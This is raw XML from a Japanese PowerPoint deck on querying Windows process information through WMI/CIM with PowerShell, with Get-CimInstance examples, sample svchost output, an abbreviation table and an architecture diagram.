              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>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Select-Object -First 1 | Format-List</a:t>
            </a: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ProcessId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>       : 1624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Name            : svchost.exe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Path            : C:\WINDOWS\system32\svchost.exe</a:t>
            </a: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parentProcessId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> : 1452</a:t>
            </a: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CommandLine</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>     : C:\WINDOWS\system32\svchost.exe -k </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>DcomLaunch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -p</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="11" name="表 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BCBC3FFA-EB27-C563-170A-67664332ED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191573"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="7860196" y="4617132"/>
          <a:ext cx="3456384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292">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2810130588"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1953092">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="25036936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Get-Process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Get-</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="ja-JP" sz="2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CimInstance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14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svchost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svchost.exe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370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ProcessId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056167"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D45099D9-D9C4-0FB1-3E13-B917DF24D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4698725"/>
            <a:ext cx="10440989" cy="677108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Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>CimInstance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の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-Filter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パラメーターを使わず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en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>Where-Object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を利用するのも有効。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CDE7E96-EE3D-44B5-0586-DC1130AEB576}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884992" y="5385410"/>
            <a:ext cx="6651168" cy="7078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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>CimInstance</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -Class Win32_Process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Where-Object {$_.Name -like "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>svchost</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>*"}</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="491574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7B14A9F4-F8B8-FE20-B9CB-45245C52C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プロセス </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| WMI/CIM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>と</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>PowerShell</a:t>
            </a:r>
            <a:endParaRPr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9A5422C-AF2A-1391-1D2E-FA69E82C10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029ADFB-FA14-FFA8-6D47-FC4EC249FD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14</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp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6721770F-9FDE-1DA5-474C-CF996AF01B31}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6456040" y="982354"/>
            <a:ext cx="4863072" cy="5002930"/>
            <a:chOff x="6456040" y="982354"/>
            <a:chExt cx="4863072" cy="5002930"/>
          </a:xfrm>
        </p:grpSpPr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008A0D98-970C-31C4-461B-14685299A7CC}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6460787" y="982354"/>
              <a:ext cx="2090765" cy="392791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140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kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1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WMI Cmdlets</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600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0B724815-8794-0630-9F69-2C42B4033CE2}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6456362" y="1704061"/>
              <a:ext cx="4858479" cy="392791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140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en-US" altLang="ja-JP" sz="16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Windows Management API</a:t>
              </a:r>
              <a:endParaRPr lang="ja-JP" altLang="en-US" sz="16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7EE717B9-40C6-E353-3163-9C5F30BB6D49}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="9228347" y="982355"/>
              <a:ext cx="2090765" cy="392791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140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en-US" altLang="ja-JP" sz="1600" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                  <a:latin typeface="メイリオ" pitchFamily="50" charset="-128"/>
                  <a:ea typeface="メイリオ" pitchFamily="50" charset="-128"/>
                </a:rPr>
                <a:t>CIM Cmdlets</a:t>
              </a:r>
              <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1600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776D3AD2-C9B0-3237-ACD5-348176266F12}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6456362" y="2420888"/>
              <a:ext cx="4858479" cy="392791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140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en-US" altLang="ja-JP" sz="16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.NET</a:t>
              </a:r>
              <a:endParaRPr lang="ja-JP" altLang="en-US" sz="16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4" name="円柱 13">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{24A95DCA-EF16-76A6-F4D0-CACC62D1B738}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="9516380" y="4581128"/>
              <a:ext cx="1404156" cy="1341740"/>
            </a:xfrm>
            <a:prstGeom prst="can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140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kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1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CIM</a:t>
              </a:r>
              <a:br>
                <a:rPr lang="en-US" altLang="ja-JP" sz="1600" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1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</a:br>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="1600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メイリオ" pitchFamily="50" charset="-128"/>
                </a:rPr>
                <a:t>Database</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP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50" charset="-128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4C97BCC5-381C-F005-1D2D-CF95A3CCB945}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6456040" y="3144221"/>
              <a:ext cx="2248065" cy="392791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140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en-US" altLang="ja-JP" sz="1600" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                  <a:latin typeface="メイリオ" pitchFamily="50" charset="-128"/>
                  <a:ea typeface="メイリオ" pitchFamily="50" charset="-128"/>
                </a:rPr>
                <a:t>DCOM (WMI/CIM)</a:t>
              </a:r>
              <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1600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E789C815-6568-655B-101D-4554EA40FCCD}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="9066776" y="3140968"/>
              <a:ext cx="2248065" cy="392791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140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en-US" altLang="ja-JP" sz="1600" dirty="0" err="1">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                  <a:latin typeface="メイリオ" pitchFamily="50" charset="-128"/>
                  <a:ea typeface="メイリオ" pitchFamily="50" charset="-128"/>
                </a:rPr>
                <a:t>WinRM</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="1600" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                  <a:latin typeface="メイリオ" pitchFamily="50" charset="-128"/>
                  <a:ea typeface="メイリオ" pitchFamily="50" charset="-128"/>
                </a:rPr>
                <a:t> (CIM)</a:t>
              </a:r>
              <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1600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60B3A2E9-9D25-CD72-2CDD-5C15E08E113D}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6456362" y="3861048"/>
              <a:ext cx="4858479" cy="392791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140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en-US" altLang="ja-JP" sz="16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CIM Object Manager</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="ja-JP" altLang="en-US" sz="16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 </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="16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(CIMOM)</a:t>
              </a:r>
              <a:endParaRPr lang="ja-JP" altLang="en-US" sz="16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6CC8A85C-9892-4839-2E11-AC101F255269}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6456363" y="4581128"/>
              <a:ext cx="2484276" cy="392791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140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en-US" altLang="ja-JP" sz="16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Provider</a:t>
              </a:r>
              <a:endParaRPr lang="ja-JP" altLang="en-US" sz="16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ECB43B28-A700-E977-ECFE-ED31F903C89E}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6456363" y="5448477"/>
              <a:ext cx="2484276" cy="392791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140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en-US" altLang="ja-JP" sz="16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Managed Entity</a:t>
              </a:r>
              <a:endParaRPr lang="ja-JP" altLang="en-US" sz="16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1A3D57F9-711C-A7E0-C8F3-9473060C0343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>
              <a:off x="7506170" y="1375145"/>
              <a:ext cx="0" cy="328916"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="28575">
              <a:headEnd type="triangl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" name="直線コネクタ 27">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9211AEF7-1DBB-9164-2300-0AD73B87C1B8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464" y="1375145"/>
              <a:ext cx="0" cy="328916"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="28575">
              <a:headEnd type="triangl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3F09B27A-1237-79D6-7A39-5C8BCD36E100}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvCxnSpPr>
              <a:cxnSpLocks/>
            </p:cNvCxnSpPr>
            <p:nvPr/>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8868308" y="2096852"/>
              <a:ext cx="0" cy="328916"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="28575">
              <a:headEnd type="triangl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0" name="直線コネクタ 29">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{443FC61D-7629-C7F1-AD00-6A8229EA139D}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvCxnSpPr>
              <a:cxnSpLocks/>
            </p:cNvCxnSpPr>
            <p:nvPr/>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7572164" y="2813679"/>
              <a:ext cx="0" cy="328916"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="28575">
              <a:headEnd type="triangl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直線コネクタ 30">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{64C0F60C-C795-E523-6DE8-814265420BDB}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvCxnSpPr>
              <a:cxnSpLocks/>
            </p:cNvCxnSpPr>
            <p:nvPr/>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="10200456" y="2813679"/>
              <a:ext cx="0" cy="328916"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="28575">
              <a:headEnd type="triangl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" name="直線コネクタ 31">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1189AE7C-D23B-B4D7-8875-882F48AD7A01}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvCxnSpPr>
              <a:cxnSpLocks/>
            </p:cNvCxnSpPr>
            <p:nvPr/>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7565781" y="3533759"/>
              <a:ext cx="0" cy="328916"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="28575">
              <a:headEnd type="triangl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直線コネクタ 32">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F389C251-99F1-FBC0-68AF-8A565A7A987D}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvCxnSpPr>
              <a:cxnSpLocks/>
            </p:cNvCxnSpPr>
            <p:nvPr/>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="10200456" y="3533759"/>
              <a:ext cx="0" cy="328916"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="28575">
              <a:headEnd type="triangl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4" name="直線コネクタ 33">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{147B6BA8-0FD0-C10C-AC0E-BC7CE70629D9}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvCxnSpPr>
              <a:cxnSpLocks/>
            </p:cNvCxnSpPr>
            <p:nvPr/>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7824192" y="5116308"/>
              <a:ext cx="0" cy="328916"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="28575">
              <a:headEnd type="triangl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直線コネクタ 34">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FDD44AAE-7BDD-8ED4-C6E7-CF21071EA79C}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvCxnSpPr>
              <a:cxnSpLocks/>
            </p:cNvCxnSpPr>
            <p:nvPr/>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7698198" y="4252212"/>
              <a:ext cx="0" cy="328916"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="28575">
              <a:headEnd type="triangl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FCED843D-4D83-8B7C-0CB1-CFB6BA055BBE}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvCxnSpPr>
              <a:cxnSpLocks/>
            </p:cNvCxnSpPr>
            <p:nvPr/>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="10200456" y="4259937"/>
              <a:ext cx="0" cy="328916"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="28575">
              <a:headEnd type="triangl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DEE9343B-E4FF-6CFC-19B4-A1A8AE0169E1}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6528048" y="4653136"/>
              <a:ext cx="2484276" cy="392791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140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en-US" altLang="ja-JP" sz="16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Provider</a:t>
              </a:r>
              <a:endParaRPr lang="ja-JP" altLang="en-US" sz="16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9A2998BA-F65F-2B45-2076-2032E22EDA21}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6528048" y="5520485"/>
              <a:ext cx="2484276" cy="392791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140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en-US" altLang="ja-JP" sz="16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Managed Entity</a:t>
              </a:r>
              <a:endParaRPr lang="ja-JP" altLang="en-US" sz="16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ED25C5D6-0647-6D25-325C-B08E00488FB6}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6600056" y="4725144"/>
              <a:ext cx="2484276" cy="392791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140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en-US" altLang="ja-JP" sz="16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Provider</a:t>
              </a:r>
              <a:endParaRPr lang="ja-JP" altLang="en-US" sz="16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88C72018-FAB4-2F78-9209-09C3F70A76BA}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6614555" y="5592493"/>
              <a:ext cx="2484276" cy="392791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140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en-US" altLang="ja-JP" sz="1600" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                  <a:latin typeface="メイリオ" pitchFamily="50" charset="-128"/>
                  <a:ea typeface="メイリオ" pitchFamily="50" charset="-128"/>
                </a:rPr>
                <a:t>Managed Entity</a:t>
              </a:r>
              <a:endParaRPr lang="ja-JP" altLang="en-US" sz="16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</p:grp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C0D66498-DC47-5676-77B3-499D45D53406}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6385618" y="6201308"/>
            <a:ext cx="49316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ja-JP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https://www.thecodeasylum.com/wmi-and-cim-with-powershell/</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="44" name="表 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{421433EB-8C60-9E85-2804-85ABDFEBE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753665"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="875221" y="1295596"/>
          <a:ext cx="5004752" cy="173736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864295">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2810130588"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="4140457">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="25036936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CIM</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="16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Common Information Model</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="16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</a:br>
                      <a:r>
                        <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="16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システム管理情報の定義を標準化したもの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14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WBEM</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="16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Web-Based Enterprise Management</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="16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  <a:p>
                      <a:r>
                        <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="16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CIM</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="16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情報を</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="16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HTTP</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="16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で操作するアーキテクチャー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370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WMI</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600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Windows Management Instrumentation</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:r>
                        <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="16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WBEM</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="16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＋</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="16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CIM</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="160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のマイクロソフトによる実装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056167"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ECE64239-294D-25A7-287B-DCE9C3D05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20" y="899428"/>
            <a:ext cx="3671890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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍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略語の整理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6" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{89681EBF-EBBE-0EC3-64EF-95A20C687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19" y="3995772"/>
            <a:ext cx="4858477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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍</a:t>
            </a:r>
            <a:r>
              <a:rPr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CIM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情報の取得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7" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ECF9ECE6-D9EC-6940-D899-5AEAA258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4450757"/>
            <a:ext cx="10440989" cy="124649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通信手法が異なる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2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系統の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Cmdlet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。</a:t>
            </a:r>
          </a:p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Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>WmiObject</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRPr>
          </a:p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Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>CimInstance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（推奨）</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{42EB2187-0AB3-D03C-C4E7-9384A1CAF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110" y="3171752"/>
            <a:ext cx="5231259" cy="677108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標準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Cmdlet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が提供しない情報には、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en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>CIM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データベースからアクセスする。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3518709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887214-45B1-1004-44E0-81DB61621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プロセス </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| CIM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>にアクセスする</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Cmdlet</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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8FFD6BA-8AFB-AA0F-C9CE-C64BC310A8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A310324-7D3C-7A32-58DE-350D559DE7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15</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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4B6EC3AE-5362-BF72-15FC-FD2886817FA0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
